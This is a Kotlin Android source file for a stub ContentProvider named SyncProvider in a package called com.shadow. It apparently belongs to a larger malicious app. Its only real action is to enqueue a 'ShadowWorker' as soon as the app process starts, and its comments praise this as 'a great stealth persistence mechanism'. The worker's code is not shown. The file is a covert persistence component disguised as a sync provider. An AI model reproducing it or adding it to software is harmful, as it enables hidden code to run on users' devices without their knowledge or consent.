package com.shadow

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.net.Uri

class SyncProvider : ContentProvider() {
    override fun onCreate(): Boolean {
        // Enqueue the worker immediately when the provider is initialized
        // This is a great stealth persistence mechanism because ContentProviders
        // are initialized before Application.onCreate() when the app process starts
        context?.let { ShadowWorker.enqueue(it) }
        return true
    }

    override fun query(
        uri: Uri, projection: Array<out String>?, selection: String?,
        selectionArgs: Array<out String>?, sortOrder: String?
    ): Cursor? = null

    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<out String>?): Int = 0
}